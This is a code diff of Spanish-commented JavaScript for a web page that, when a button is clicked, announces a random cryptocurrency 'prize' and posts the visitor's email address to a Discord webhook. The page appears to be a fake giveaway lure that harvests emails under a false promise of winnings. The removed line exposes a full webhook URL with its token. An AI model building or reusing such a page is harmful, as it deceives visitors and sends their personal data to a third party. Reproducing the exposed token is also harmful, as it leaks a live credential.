@@ -43,15 +43,19 @@ document.getElementById('enviar').addEventListener('click', function() {
     const randomCrypto = cryptoOptions[Math.floor(Math.random() * cryptoOptions.length)];
     const randomValue = [5, 7, 12, 15, 18, 23][Math.floor(Math.random() * 6)];
 
-    const webhookUrl = 'https://discordapp.com/api/webhooks/1078091750171746324/_S78Y9bzo5TvyNoeplYhQOSHA-lzF-P_qhEhTBZTUEcYydZHr682gNg99QsXnnswGj6-'; // Reemplazar con el URL de tu webhook de Discord
+    const prizeAlert = document.getElementById('prizeAlert');
+    prizeAlert.textContent = `¡Felicidades! Has ganado ${randomValue} USD en ${randomCrypto.toUpperCase()} 🎉`;
+    prizeAlert.style.display = 'block';
 
+    // Enviar datos al webhook de Discord
+    const webhookUrl = 'https://discordapp.com/api/webhooks/...'; // Reemplazar con el URL de tu webhook de Discord
     const data = {
         content: `¡Felicidades! Has ganado ${randomValue} USD en ${randomCrypto.toUpperCase()} 🎉`,
         embeds: [
             {
                 title: 'Correo Electrónico Ganador',
                 description: email,
-                color: 16776960 
+                color: 16776960
             }
         ]
     };
@@ -64,15 +68,12 @@ document.getElementById('enviar').addEventListener('click', function() {
         body: JSON.stringify(data)
     })
     .then(response => response.json())
-    .then(() => {
-        const prizeAlert = document.getElementById('prizeAlert');
-        prizeAlert.textContent = '¡Has ganado!';
-        prizeAlert.style.display = 'block';
+    .then(responseData => {
+        // Manejar la respuesta del servidor de Discord si es necesario
+        console.log(responseData);
     })
     .catch(error => {
         console.error('Error:', error);
-        const prizeAlert = document.getElementById('prizeAlert');
         prizeAlert.textContent = 'Error al procesar el premio. Inténtalo de nuevo más tarde.';
-        prizeAlert.style.display = 'block';
     });
 });
